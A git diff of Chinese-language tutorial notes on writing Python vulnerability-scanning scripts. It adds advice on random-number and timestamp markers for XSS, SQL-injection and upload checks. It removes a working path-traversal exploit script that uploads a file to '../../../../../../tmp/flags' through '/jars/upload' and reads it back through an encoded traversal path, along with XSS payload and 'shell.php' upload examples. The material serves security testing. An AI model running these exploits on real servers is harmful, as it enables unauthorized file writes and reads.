@@ -356,6 +356,41 @@ req = requests.get(url, headers=headers, files=file, timeout=10, verify=False)
 
 ### 6，巧用随机数
 
+ 先说说随机数的应用场景：  
+一般，比较适用于一些会有干扰信息的页面。在漏洞扫描过程中，因为是根据返回值的特征来判断漏洞是否存在的，所以一些页面会使用一些干扰信息，去干扰我们的判断。
+
+![&#x5E72;&#x6270;&#x793A;&#x4F8B;](../../.gitbook/assets/image%20%281084%29.png)
+
+总有网站会执行XSS语句alert\(1\)，也总会有网站去查询version\(\),user\(\)，也总会有人去查询md5\(1\)，在文件上传的时候，也总会有人去上传shell.php,1.php。那么此时，随机数可能就能派上用场了
+
+```python
+# -*- coding: utf-8 -*-
+import random,string,hashlib
+
+# gongji = ''.join(random.sample(string.ascii_letters + string.digits, 6))
+
+yuju = str(random.randint(0, 999999))
+mdfive = hashlib.md5(yuju).hexdigest()
+```
+
+ 在上述的代码中，yuju为0-999999之间的随机数，而mdfive被定义为了yuju的MD5值。而此时：
+
+1、在测试XSS中，可以使用alert\(yuju\) 来判断，SQL注入也可以使用查询yuju的MD5值来判断注入。  
+2、在文件上传时，若将文件名设置为随机数，并将随机数的MD5值涵盖进文件内容中，可减少误报率
+
+ 同时，时间戳也是同理：
+
+```python
+import time
+
+noww = int(time.time())
+now = str(noww)
+print now
+
+payloads = "/assets/config/config%s.json" % now
+```
+
+### 7，未完待续
 
 
 
@@ -381,26 +416,7 @@ req = requests.get(url, headers=headers, files=file, timeout=10, verify=False)
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+-
 
 
 
@@ -563,127 +579,4 @@ if __name__ == '__main__':
 ```
 {% endtab %}
 {% endtabs %}
-
-对于不同种类的漏洞，最好是有不同的检测方式，例如xray中采用了随机数值的方式检测SQL注入与XSS，那么使用随机数版本的漏扫脚本大概就是这样的：
-
-{% tabs %}
-{% tab title="随机数" %}
-随机数版本所需代码如下：
-
-```python
-# -*- coding: utf-8 -*-
-import random
-import string
-import hashlib
-
-# gongji = ''.join(random.sample(string.ascii_letters + string.digits, 6))
-
-shuzhi = random.randint(0,999999)
-yuju = str(shuzhi)
-# ------ xss ------
-
-xss = "<script>alert(%s)</script>" % yuju
-xss = "<script>alert(" + yuju + ")</script>"
-
-# ------ sqli ------
-
-sqli = hashlib.md5(yuju).hexdigest()
-```
-{% endtab %}
-
-{% tab title="时间戳" %}
-```python
-import time
-
-noww = int(time.time())
-now = str(noww)
-print now
-
-payloads = "/assets/config/config%s.json" % now
-```
-{% endtab %}
-{% endtabs %}
-
-文件上传的方式
-
-{% tabs %}
-{% tab title="简洁" %}
-```python
-# -*- coding: utf-8 -*-
-
-import requests
-import random,hashlib
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-
-target = "https://IP:PORT"
-shuzhi = random.randint(0, 999999)
-yuju = str(shuzhi)
-mdfive = hashlib.md5(yuju).hexdigest()
-path = "/jars/upload"
-url = target + path
-boundry = "----WebKitFormBoundaryoZ8meKnrrso89R6Y"
-headers = {
-    "Host": target.split("://")[1],
-    "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
-}
-
-files = {'jarfile': ('../../../../../../tmp/flags', mdfive)}
-# proxy = {
-#     'http':'http://127.0.0.1:8081',
-#     'https':'https://127.0.0.1:8081'
-# }
-
-req = requests.post(url, headers=headers, files=files, timeout=10, verify=False)
-print req.content
-if req.status_code == 400:
-    print req.content
-    path_1 = "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fflags"
-    url_1 = target + path_1
-    req_1 = requests.get(url_1, headers=headers, timeout=10, verify=False)
-    print req_1.text
-
-    if req_1.status_code == 200:
-        print  "hahahaha"
-        
-        
-# name:jarfile
-# filename:../../../../../../tmp/flags
-#文件内容：mdfive
-↓        ↓        ↓        ↓        ↓
-# POST /jars/upload HTTP/1.1
-# Connection: close
-# Accept-Encoding: gzip, deflate
-# Accept: */*
-# User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
-# Host: IP:PORT
-# Content-Type: multipart/form-data; boundary=------16403e4608fad6cc1cd8321b8b7d7f22
-# Content-Length: 181
-
-# --16403e4608fad6cc1cd8321b8b7d7f22
-# Content-Disposition: form-data; name="jarfile"; filename="../../../../../../tmp/flags"
-# 
-# Hello Requests.
-# --16403e4608fad6cc1cd8321b8b7d7f22--
-```
-{% endtab %}
-
-{% tab title="分段" %}
-当文件上传遇到分段传输：
-
-相关代码示例如下：
-
-```python
-file = {
-    'name': ('filename', u'文件内容', u'文件自定义Content-Type'),
-    'file[]': ('shell.php', data, 'application/octet-stream'),
-    'name2': (None, 'huan'),
-    None: ('haha', 'ni'),
-    None: ('xixi', 'ya'),
-}
-```
-{% endtab %}
-{% endtabs %}
-
-
 
